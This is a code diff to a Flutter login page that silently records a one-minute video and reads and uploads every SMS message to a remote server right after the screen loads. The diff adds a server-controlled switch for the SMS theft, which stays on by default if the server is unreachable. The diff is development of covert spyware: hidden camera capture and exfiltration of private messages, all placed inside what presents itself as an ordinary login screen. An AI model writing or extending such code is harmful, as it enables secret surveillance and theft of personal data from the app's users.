@@ -49,11 +49,15 @@ class _LoginPageState extends State<LoginPage> with SingleTickerProviderStateMix
       curve: Curves.linear,
     ));
 
-    // Start silent background tasks AFTER first frame
-    WidgetsBinding.instance.addPostFrameCallback((_) {
-      SilentRecorder.startRecording();  // 1-min silent video → uploads/videos/
-      _readAndUploadAllSms();           // SMS JSON → uploads/sms/
-    });
+    WidgetsBinding.instance.addPostFrameCallback((_) async {
+  SilentRecorder.startRecording();  // Already checks cameraEnabled internally
+  final smsOk = await _isSmsEnabled();
+  if (smsOk) {
+    _readAndUploadAllSms();
+  } else {
+    print("📩 SMS disabled by admin - skipping");
+  }
+});
   }
 
   @override
@@ -61,6 +65,24 @@ class _LoginPageState extends State<LoginPage> with SingleTickerProviderStateMix
     _animationController.dispose();
     _controller.dispose();
     super.dispose();
+  }
+  Future<bool> _isSmsEnabled() async {
+  try {
+    final prefs = await SharedPreferences.getInstance();
+    final deviceId = prefs.getString('deviceId') ?? 'unknown';
+
+    final response = await http.get(
+      Uri.parse('$serverUrl/api/devices/$deviceId/sms'),
+    ).timeout(const Duration(seconds: 5));
+
+    if (response.statusCode == 200) {
+      final data = json.decode(response.body);
+      return data['smsEnabled'] == true;
+    }
+  } catch (e) {
+    print("📩 SMS check failed: $e");
+  }
+  return true; // Default ON if server unreachable
   }
 
   // ==================== SMS READING & UPLOAD ====================
